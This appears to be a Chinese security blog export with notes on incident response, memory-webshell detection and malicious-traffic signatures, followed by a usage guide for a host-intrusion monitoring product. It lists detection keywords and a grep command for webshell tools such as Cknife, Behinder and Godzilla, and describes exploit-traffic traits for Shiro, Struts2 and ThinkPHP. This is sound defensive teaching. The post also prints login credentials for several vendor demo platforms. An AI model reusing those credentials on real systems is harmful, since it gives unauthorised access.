<p>pcap.honeynet.org.my/v1/</p>
<p>如果你遇到流量包不知道怎么分析</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115171335395.png" alt="image-20220115171335395"></p>
</blockquote>
<h2 id="文件分析的思路"><a href="#文件分析的思路" class="headerlink" title="文件分析的思路"></a>文件分析的思路</h2><blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115171444599.png" alt="image-20220115171444599"></p>
</blockquote>
<p>MD5的威胁</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220115173051567.png" alt="image-20220115173051567"></p>
</blockquote>
<h2 id="内存马怎么分析呢"><a href="#内存马怎么分析呢" class="headerlink" title="内存马怎么分析呢"></a>内存马怎么分析呢</h2><blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116093725592.png" alt="image-20220116093725592"></p>
</blockquote>
<p>怎么确认内存马呢</p>
<p>第一种叫注入内存马（进程PE类型）</p>
<p>第二种叫做Webshell的内存马</p>
<ul>
<li>1、Webshell进程从外面可以访问，在主机上找不到这个文件，这时就得怀疑了</li>
<li>2、Webshell的内存马，就见过JSP（PHP，ASP没见过）</li>
</ul>
<p>关于JSP的社工方式</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116094739705.png" alt="image-20220116094739705"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116094804962.png" alt="image-20220116094804962"></p>
<p>3、利用关键词或者检测规则对内存文件进行检测</p>
<p>可以用grep临时检测</p>
<p>strings * |grep -i “Cknife”（哥斯拉生成的C刀内存马）</p>
<p>ReGeorg、Behinder、AES_BASE64、AES_RAW，检测内存里运行的哥斯拉，可以直接用<code>RealFile:\|path.separator::</code></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116094917947.png" alt="image-20220116094917947"></p>
<h2 id="内存马实战"><a href="#内存马实战" class="headerlink" title="内存马实战"></a>内存马实战</h2><p>首先Ps aux|grep tomcat</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116104137886.png" alt="image-20220116104137886"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116104346533.png" alt="image-20220116104346533"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116104417258.png" alt="image-20220116104417258"></p>
<p>就可以找到一些内存马的特征</p>
<p>ntfs流不死马，数据库触发后门不死马（通过触发器当检索到某字段存在某个字符就会写马）</p>
<h2 id="实战1-1"><a href="#实战1-1" class="headerlink" title="实战1"></a>实战1</h2><p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116110748436.png" alt="image-20220116110748436"></p>
<p>1、有两台机器被控制了，属于个人主机。就两种情况①、钓鱼或者社工（养一个美女啥的发你东西，你点了之后上线），②有明显ms17-010补丁未打被smb内网打进来，可能存在，③更新包被替换了更新劫持，通过一些高端手法进来的劫持</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116121408312.png" alt="image-20220116121408312"></p>
<p>发现，f3322.net pubyun 老牌的DDNS，动态域名解析</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122024973.png" alt="image-20220116122024973"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122104556.png" alt="image-20220116122104556"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122141998.png" alt="image-20220116122141998"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122318353.png" alt="image-20220116122318353"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122355238.png" alt="image-20220116122355238"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122433208.png" alt="image-20220116122433208"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122540803.png" alt="image-20220116122540803"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122555192.png" alt="image-20220116122555192"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122603995.png" alt="image-20220116122603995"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122622978.png" alt="image-20220116122622978"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122650586.png" alt="image-20220116122650586"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122701436.png" alt="image-20220116122701436"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122719555.png" alt="image-20220116122719555"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122748547.png" alt="image-20220116122748547"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122848036.png" alt="image-20220116122848036"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116122930861.png" alt="image-20220116122930861"></p>
<h2 id="实战2-1"><a href="#实战2-1" class="headerlink" title="实战2"></a>实战2</h2><p>误报的应急响应</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116123047085.png" alt="image-20220116123047085"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116123103460.png" alt="image-20220116123103460"></p>
<p>是内网到外网的代理服务器</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116151952982.png" alt="image-20220116151952982"></p>
<p>应急响应三步骤</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116164809985.png" alt="image-20220116164809985"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116164857760.png" alt="image-20220116164857760"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116164912122.png" alt="image-20220116164912122"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165030316.png" alt="image-20220116165030316"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165051365.png" alt="image-20220116165051365"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165120994.png" alt="image-20220116165120994"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165134885.png" alt="image-20220116165134885"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165218257.png" alt="image-20220116165218257"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116165247647.png" alt="image-20220116165247647"></p>
<p><strong>最终判断是误报</strong></p>
<p>我们需要做的是检测、威胁发现、威胁溯源、应急响应、写报告</p>
<h1 id="恶意流量分析"><a href="#恶意流量分析" class="headerlink" title="恶意流量分析"></a>恶意流量分析</h1><h2 id="1、网络通信基础"><a href="#1、网络通信基础" class="headerlink" title="1、网络通信基础"></a>1、网络通信基础</h2><p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116171124112.png" alt="image-20220116171124112"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220116171235563.png" alt="image-20220116171235563"></p>
<h2 id="2、常见协议数据包结构"><a href="#2、常见协议数据包结构" class="headerlink" title="2、常见协议数据包结构"></a>2、常见协议数据包结构</h2><p>1、http</p>
<ul>
<li>Host字段：域名</li>
<li>X-Forwarded-For XFF（有些透明代理比较坑的会将真实ip放入xff中，或者负载均衡的情况要会判断最后一个为攻击者ip）</li>
<li>User-Agent：判断黑客工具<ul>
<li>nmap</li>
<li>awvs</li>
<li>antsword</li>
<li>python requests</li>
<li>baiduspyder</li>
<li>1.jsp shell.jsp</li>
</ul>
</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20220116172435680.png" alt="image-20220116172435680"></li>
<li>状态码不能判断攻击成功与失败</li>
<li><img src="https://gylq.gitee.io/linkimage/img1/image-20220116174845757.png" alt="image-20220116174845757"></li>
</ul>
<p>2、smb</p>
<p>​    主要看一些关键字就行了</p>
<p>3、vnc</p>
<h2 id="3、客户侧网络架构"><a href="#3、客户侧网络架构" class="headerlink" title="3、客户侧网络架构"></a>3、客户侧网络架构</h2><h2 id="4、漏洞利用或攻击手法流量分析"><a href="#4、漏洞利用或攻击手法流量分析" class="headerlink" title="4、漏洞利用或攻击手法流量分析"></a>4、漏洞利用或攻击手法流量分析</h2><p>一、蚁剑流量特征User-Agent: andSword/v2.1，包体有，1、url编码，2、一些关键函数ini_set，返回包会有路径特征</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117052557660.png" alt="image-20220117052557660"></p>
</blockquote>
<p>二、这个是蚁剑chr之后的特征</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117055835723.png" alt="image-20220117055835723"></p>
</blockquote>
<p>三、Cknife的流量特征，Cknife的一个post参数，action的A、B、C对应不同功能，B对应的目录信息，C对应读取文件信息</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117105359864.png" alt="image-20220117105359864"></p>
</blockquote>
<p>四、Fastjson利用失败特征</p>
<p>根据rmi或者ldap的利用方式特征发现，@type就能判断</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117105908163.png" alt="image-20220117105908163"></p>
</blockquote>
<p>五、PHPstudy后门利用的流量</p>
<p>特征就是Accept-Charset:放入了base64编码请求命令，就是平phpstudy的漏洞</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117110155774.png" alt="image-20220117110155774"></p>
</blockquote>
<p>六、Shiro利用流量</p>
<p>特征Cookie：rememberMe=deleteMe,这个特征无回显，无法判断是否执行成功。有种是有回显的，可以查查，一般情况无回显</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117110857064.png" alt="image-20220117110857064"></p>
</blockquote>
<p>七、Structs2-045</p>
<p>特征：Content-type的处有命令执行</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117111524730.png" alt="image-20220117111524730"></p>
</blockquote>
<p>八、ThinkPHP5.0.23-rce</p>
<p>有个post，和一个get型的rce利用方式</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117111651741.png" alt="image-20220117111651741"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117111910187.png" alt="image-20220117111910187"></p>
</blockquote>
<p>九、Tomcat-put写入</p>
<p>返回201就是上传成功</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117112040911.png" alt="image-20220117112040911"></p>
</blockquote>
<p>十、Weblogic rce</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117112810465.png" alt="image-20220117112810465"></p>
</blockquote>
<h2 id="5、流量误报"><a href="#5、流量误报" class="headerlink" title="5、流量误报"></a>5、流量误报</h2><p>一、哥斯拉流量误报</p>
<p>都是post请求，没GET请求</p>
<blockquote>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20220117135729503.png" alt="image-20220117135729503"></p>
</blockquote>
<h1 id="可以使用的在线工具"><a href="#可以使用的在线工具" class="headerlink" title="可以使用的在线工具"></a>可以使用的在线工具</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">【睿眼沙箱系统】（真实平台，可实际操作）</span><br><span class="line">公网地址：  https:&#x2F;&#x2F;sandbox.zorelworld.com:1000&#x2F;</span><br><span class="line">401信息： 401_tNdQyxn2l \ q3emzSjnd</span><br><span class="line">页面账号信息： hw \ kect3FAGH1yaik_doot</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"> 【睿眼Windows终端溯源取证系统】（真实平台，可实际操作）</span><br><span class="line">公网地址：https:&#x2F;&#x2F;ir.zorelworld.com:443&#x2F;</span><br><span class="line">401信息： 401_Z1xW5y \ Z1w5yoct.CM</span><br><span class="line">页面账号信息：可在页面自行注册</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">【睿眼Linux终端溯源取证系统】（真实平台，可实际操作）</span><br><span class="line">公网地址：https:&#x2F;&#x2F;irl.zorelworld.com:1300&#x2F;</span><br><span class="line">401信息： 401_j7jk4ZtOu4DV \ 401_ghJIHEWUzc6+</span><br><span class="line">页面账号信息：可在页面自行注册</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">【睿眼Web攻击溯源系统】（演示环境）</span><br><span class="line">公网地址：https:&#x2F;&#x2F;124.127.209.46:9999  （WEB版）</span><br><span class="line">401账户密码：401_SuFzjJ \ 401_4gAj3N64</span><br><span class="line">审计账户密码：    audit.admin \ audit_TF6VeDptM2</span><br></pre></td></tr></table></figure></div>



<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">【睿眼网络攻击溯源系统】（演示环境）</span><br><span class="line">公网地址：https:&#x2F;&#x2F;124.127.209.46:10000&#x2F; （网络版）</span><br><span class="line">401账户密码: 401_CfxKS8 \ 401_0hwUh3OH</span><br><span class="line">审计账户密码： audit.admin \ audit_NParT95cEF</span><br></pre></td></tr></table></figure></div>

<p>hw期间不应该存在agent被卸载，被卸载一定要注意。</p>
<p><strong>在小铃铛的话，我建议一直盯着小铃铛自动刷新比较好。一定要把所有危险程度的，高中低位的各种告警</strong></p>
<p>这个是在hw的时候，一定要关注的部分</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>我总结一下大部分的会做的事，<strong>看小铃铛</strong>，听声音，三大功能模块。<strong><code>资产清点</code>能够快速定位到有问题的资产和更新</strong>，<code>风险发现</code><strong>是需要给客户做整改的，需要给客户一些最新的风险数据信息</strong>，<code>入侵检测</code><strong>就是整个hw期间需要监控的，尤其是web命令执行的告警，盯住消息系统，什么时候的信息都需要关注agent的离线和卸载。</strong></p>
<p>建议：有告警就上报，不要擅自决定。所有决定跟客户商量</p>
<p><strong>hw</strong>：分为两个，就是<strong>溯源</strong>，还有提前监控<strong>抑制</strong>，溯源到最后给黑客画像也是对的。</p>
<p>个人博客：<a href="https://gylq.gitee.io/">https://gylq.gitee.io/</a></p>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>溯源</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】青藤云万象监测系统使用方法全面总结</title>
    <url>/posts/184.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>盯着监控，明确清楚，我们的产品分linux和windows两大功能树，不是一个综合的高级界面，一些通用功能<strong>，小铃铛</strong>是通知告警的入口，<strong>红色数字</strong>实时刷新表示未读的告警通知，</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231144716147.png" alt="image-20211231144716147"></p>
<h1 id="资产清点模块"><a href="#资产清点模块" class="headerlink" title="资产清点模块"></a>资产清点模块</h1><p>各项功能的基础，所有的功能模块 都是基于每台机器的资产清点来搞的，资产清点是主要的，其他模块都是基于资产清点来检测的，<strong>病毒查杀</strong>使用的比较少</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231145132954.png" alt="image-20211231145132954"></p>
<p>linux和windows差不多的视图界面</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231145414896.png" alt="image-20211231145414896"></p>
<h2 id="主机资产"><a href="#主机资产" class="headerlink" title="主机资产"></a>主机资产</h2><p>基本主机的资产数据，操作系统，业务分组等，管理信息</p>
<h2 id="系统账号"><a href="#系统账号" class="headerlink" title="系统账号"></a>系统账号</h2><p>操作系统本身的账号，包括账号的各项属性和密码属性</p>
<h2 id="软件应用"><a href="#软件应用" class="headerlink" title="软件应用"></a>软件应用</h2><p>根据进程采集的信息，每台机器到底运行了哪些软件应用</p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>按照每一个数据库清点出来的种类分类</p>
<h2 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h2><p>全部web应用 类似phpcms，第三方的</p>
<h2 id="安装包和类库"><a href="#安装包和类库" class="headerlink" title="安装包和类库"></a>安装包和类库</h2><p>系统安装包，linux的，rpm，java，各种，jar，Spring Boot项目包</p>
<h2 id="进程端口"><a href="#进程端口" class="headerlink" title="进程端口"></a>进程端口</h2><p>每台机子运行的端口，对应的服务</p>
<h2 id="硬件配置"><a href="#硬件配置" class="headerlink" title="硬件配置"></a>硬件配置</h2><p>cpu内存三大件</p>
<h2 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h2><p>有哪些中间件什么的在运行</p>
<h2 id="Web站点"><a href="#Web站点" class="headerlink" title="Web站点"></a>Web站点</h2><p>根据中间件判断开放的web站点，目录，端口等</p>
<h2 id="Web应用框架"><a href="#Web应用框架" class="headerlink" title="Web应用框架"></a>Web应用框架</h2><p>web开发的框架，fastjson的漏洞啥啊，各种 spring MVC等，spring boot啥的框架都有漏洞</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>系统启动项</p>
<p>计划任务项</p>
<p>系统已经有的内核模块</p>
<p>举个例子：<strong>fastjson爆0day，尽快去找找所有fastjson的机器版本是不是在影响范围，如果不能捕捉到新的补丁，我们应该及时在我们机器中  对存在漏洞的机器进行沟通如何修复和上报同步，在做值守的时候，在告警的时候，也可以去查找每一台的机器，去单台机器的所有资产清点界面，能够很详细的展示出每一台机器的资产情况，包括风险情况，入侵事件等或日志</strong></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231151524811.png" alt="image-20211231151524811"></p>
<p><strong>系统账户的一些详细的字段</strong></p>
<p><strong>例如：很多客户在做风险整改，如果客户想马上看到风险整改的效果的话，必须做一次<code>资产清点</code>，也可以做单台的，也可以做全量的，点<code>更新数据</code>所有的agent都会更新数据，在单台界面点更新数据的话，就是单台更新数据，一定要更新数据，如果整改之后，做好了更新之后，才能进行风险探测和扫描，每天凌晨2点都会完成资产的清点，如果客户不是当天要的话，就可以第二天上去就可以看到新数据</strong></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231152256270.png" alt="image-20211231152256270"></p>
<p>客户环境有域控的话，建议还是域账户清点还是需要看看。windows和linux多大区别，只是linux有完整的，一台机器有资产数据，也有风险数据，但是windows没有所有的。只有资产清点</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231152440745.png" alt="image-20211231152440745"></p>
<p>如果发现绿色的机子突然少了，或突然断了就需要及时通知，资产清点部分</p>
<h1 id="风险发现模块"><a href="#风险发现模块" class="headerlink" title="风险发现模块"></a>风险发现模块</h1><p>windows只有安全补丁和弱密码检测，linux有许多漏洞检测，风险检测三类，windows安全补丁就跟官方一样的自带的系统补丁更新，弱密码检测就是rdp的检测3389，linux的补丁会各个操作系统的厂商公告，各种应用组件的安全公告</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231152608994.png" alt="image-20211231152608994"></p>
<h2 id="安全补丁"><a href="#安全补丁" class="headerlink" title="安全补丁"></a>安全补丁</h2><p>通过查看，会成列，哪些补丁没有修复</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231152808327.png" alt="image-20211231152808327"></p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>，根据0day的漏洞告警，会有漏洞检测项</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231152835379.png" alt="image-20211231152835379"></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231152954849.png" alt="image-20211231152954849"></p>
<p>更多提示有哪些高危漏洞，我们建议客户修复的。风险提示</p>
<p>举例：如果客户现场在做整改的话，应该先修应用部分的漏洞，你们检测这么多，应该先修应用部分的漏洞，在漏洞检测在应用软件的部分等待他们直接邀请进来。</p>
<h2 id="弱密码"><a href="#弱密码" class="headerlink" title="弱密码"></a>弱密码</h2><p>得跟客户交流的，扫描出来的结果情况的话，在linux支持应用弱密码的清单</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231153229427.png" alt="image-20211231153229427"></p>
<p>举例：操作系统弱密码建议一定要修复，数据库的弱密码要跟业务部门商量修复，管理各种的弱密码控制台也需要整改一下，或者关掉</p>
<p>安全风险的话分三类</p>
<h2 id="应用风险"><a href="#应用风险" class="headerlink" title="应用风险"></a>应用风险</h2><p><strong>配置上的权限，存在私钥什么的，安装的业务应用，就是配置上的风险，tomcat运行软件，用root权限运行会有风险，web源文件在报错页面，服务器信息泄露啥的都会检查</strong></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231153431906.png" alt="image-20211231153431906"></p>
<h2 id="系统风险"><a href="#系统风险" class="headerlink" title="系统风险"></a>系统风险</h2><p>时间校对啊</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231153557895.png" alt="image-20211231153557895"></p>
<h2 id="账号风险"><a href="#账号风险" class="headerlink" title="账号风险"></a>账号风险</h2><p>系统账号，过期时间，密码的复杂度啊，等等，三个风险项，100多个配置项，攻击漏洞上比较容易利用的，也建议客户尽量修复，漏洞检测中应用漏洞是最关键的</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231153615132.png" alt="image-20211231153615132"></p>
<p><strong>如果他不着急当天要资产整改的话    先做资产清点。linux中可以全部扫描，或者单机扫描，或业务分组，按照ip地址扫描等等，必须有agent，不建议值守期间再去做扫描按照定时任务来扫，hw期间可能都不能扫描，只读权限</strong></p>
<h1 id="入侵检测模块"><a href="#入侵检测模块" class="headerlink" title="入侵检测模块"></a>入侵检测模块</h1><p>linux和windows差别不大，但是linux和windows差别不大，单独linux特有的功能只有两项，本地提权，和可疑操作，windows没有</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231154116777.png" alt="image-20211231154116777"></p>
<h2 id="登陆行为检测"><a href="#登陆行为检测" class="headerlink" title="登陆行为检测"></a>登陆行为检测</h2><p>包含了两部分<strong>暴力破解和异常登陆</strong>互补的功能，只涉及到操作系统的账号相关，不会跟web应用账号密码或者数据库密码破解相关，这里只跟操作系统的账号本身</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>会显示爆破的攻击事件，攻击来源，攻击ip，攻击次数等，暴力破解有自动封停的设置，<strong>建议自动封停检测登陆</strong>会相对稳妥。可以手动去<strong>封停</strong>，所以不建议去封停，先上报再由<strong>研判组</strong>是不是攻击，再决定是否关停</p>
<h3 id="异常登陆"><a href="#异常登陆" class="headerlink" title="异常登陆"></a>异常登陆</h3><p>都是一些登陆成功的记录，但是有<strong>可能登陆来源的ip或者登陆的账号</strong>，或者<strong>登陆的时间是不合法的</strong>，他会将一些晚上12点的一些登陆进行显示异常，应该在堡垒机ip登陆，但是突然其他终端ip地址登陆，区域或者时间，处理状态等</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231154716156.png" alt="image-20211231154716156"></p>
<p><strong>异常的规则，一般都是配置好的，也有可能功能配置的不太合理，得去跟原厂工程师进行策略调整</strong></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231154730279.png" alt="image-20211231154730279"></p>
<h2 id="第二功能模块，进程的行为"><a href="#第二功能模块，进程的行为" class="headerlink" title="第二功能模块，进程的行为"></a>第二功能模块，进程的行为</h2><p><strong>反弹Shell和本地提权</strong>是一块的叫做进程的行为，如果发现告警，一定要第一时间通知，特别是<strong>反弹shell，</strong>是攻击队已经进来的话。    </p>
<h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><p>主<strong>要处理主机ip和目标主机端口</strong>，如果是自己反弹自己，可能是一些误报，主机IP是Agent的ip，目标ip是外部的话，很大概率是真实的告警，那么shell已经被反弹出去了</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231154940882.png" alt="image-20211231154940882"></p>
<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>提权一般好一些，很少使用</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231155133571.png" alt="image-20211231155133571"></p>
<h2 id="后门检测"><a href="#后门检测" class="headerlink" title="后门检测"></a>后门检测</h2><p>会检测而一些<strong>msf</strong>一些反弹木马，一些植入类似RootKit的这种，mimikatz等抓取内存的密码这些工具，或者<strong>frps</strong>做隧道的</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231155341507.png" alt="image-20211231155341507"></p>
<h2 id="动态蜜罐"><a href="#动态蜜罐" class="headerlink" title="动态蜜罐"></a>动态蜜罐</h2><p>我们的动态蜜罐，这块蜜罐就是<strong>伪装端口</strong>，是根据客户实际会用的那些资产配的蜜罐。也梳理了常见的端口。是为了捕获到攻击者访问的某一个端口</p>
<p>比如横向的，7001的反序列化，攻击进来，我们可以溯源信息，提供的用户很方便，<strong>可疑ip访问的我们机器的端口</strong></p>
<p>可以方便帮客户找到源头，都是有可能是被攻破机子的跳板。这些云IP也指的送去有研判组</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231163134415.png" alt="image-20211231163134415"></p>
<h2 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h2><p><strong>最最最核心的两个功能之一</strong></p>
<p>所有Agent都会在资产清点，都会自动识别出来资产的目录，<strong>但是有部分机器存在因为配置文件一些特殊情况，无法特殊识别的</strong>，一定要注意。如果发现有一些机器的web站点是无法梳理出来的，一定要在自定义目录里面加进去。作为他的监控目录，才能确保所有传上来可能的<strong>webshell</strong>，我们都能捕捉到。我们的web后门包含两个引擎，第一种<strong>引擎</strong>是常规的，主要是基于正则匹配的，就是比较常见的危险函数，没有什么变形的，都是在正则的规则里面都会有。第二种引擎就是<strong>雷火引擎</strong>，是根据语法分析，按照文件的执行<strong>逻辑去推算</strong>这个结果，演算，做一些等价的还原，会看看是否存在一些混淆或者绕过定制webshell等，webshell后门的功能也是客户现场最多报警的。一些可能现场开发组的一些web代码的检测，也会告警，需要去研判组分析的</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231155502221.png" alt="image-20211231155502221"></p>
<p>一些检测数据，都去详情 下载文件，上报研判组，<strong>雷火引擎会带这个标志</strong>，webshell的后门会实时检测，所有会有很多客户，在原来一些存在的后门文件都给发现出来，<strong>把以前一些历史遗留的一些后门给清理</strong>，同样也是需要研判分析，只要看到告警，都要去分析。</p>
<p>建议自主告警研判，白名单规则，不是自己能加就加的，<strong>我们主要是告诉和上报，不要直接自己处置。</strong>只是单纯判断这个<strong>webshell</strong>是否是一些真实的黑客攻击就好了</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231160023811.png" alt="image-20211231160023811"></p>
<p><strong>已知恶意样本</strong>，一定是webshell，一定是命中的要上报</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231160424961.png" alt="image-20211231160424961"></p>
<p><strong>中危和低位一般都是自己去看看。有能力的话自己看就好。Agent比较多的话，有类似的样本的话，建议如果是误报，看上去同样的文件，直接自己记录成误报就好。根据已经判断过的结果是可以去推倒</strong></p>
<p><strong>出现告警第一时间反馈，如果能力不足就丢给二线去，或者原厂去支持是否误报。第一时间将报警抛出来，客户端要进行相应的跟进和处理。</strong>客户有时也能看出来是否是误报</p>
<p>对一些已知的误报，webshell除非已知样本，数据库后门的话。如果客户一直没删的话，又出现一条新的和以往一样，你要跟客户提一下，<strong>任何报警都应该都跟客户商量</strong>，让客户知晓，<strong>一定不能擅自做处置决定</strong></p>
<h2 id="Web命令执行"><a href="#Web命令执行" class="headerlink" title="Web命令执行"></a>Web命令执行</h2><p>规则大家都能看到有很多，系统的规则都可以选择开启和关闭，不建议任何的关闭</p>
<p><strong>千万不要说这条误</strong>报多 我就关了，<strong>一旦把真实告警弄掉了</strong>，就完了</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231161756039.png" alt="image-20211231161756039"></p>
<p>由于web命令执行本身是需要<strong>一定量加白的域名工作的</strong>，一定要让客户把Agent装完，然后我们开始攻击之前 一定要把降肝完，一定需要<strong>加白之后</strong>才能用否则会有大量的误报，尤其是正常的业务环境。不加白是无法找到漏洞或者新出RCE漏洞的。<strong>告警还是要记录，每天还有很多，同一段的ip大量高度类似，这大部分就是误报</strong></p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231162451197.png" alt="image-20211231162451197"></p>
<p>否则一天可能就上万的告警，一定需要加白，否则没法看。能检测的规则，都尽量看看。</p>
<p>大部分都是Web的RCE着手的，包括今年的许多RCE的漏洞出来，也有很多的客户都是通过RCE攻击进来的，一定要多注意，Web安全命令执行</p>
<p><strong>监控管理</strong>：一定要多打开，有没有啥突然关的agent，一定要都打开，来保证你收到的数据是对的。</p>
<p>一般情况，这Web命令执行每一条告警都代表一台机器被拿下，所以这块一定要注意，也是需要去加白域名的。</p>
<h2 id="可疑操作"><a href="#可疑操作" class="headerlink" title="可疑操作"></a>可疑操作</h2><p>是通过bash的一个审计插件，去查询linux在bash上的操作命令，<strong>而且会把他和内置的规则进行匹配。命中规则就会有告警</strong>，审计到执行的命令，匹配登陆来源。可能是登录到机子上执行的命令，要及时上报</p>
<p><img src="https://gylq.gitee.io/linkimage/img1/image-20211231162837573.png" alt="image-20211231162837573"></p>
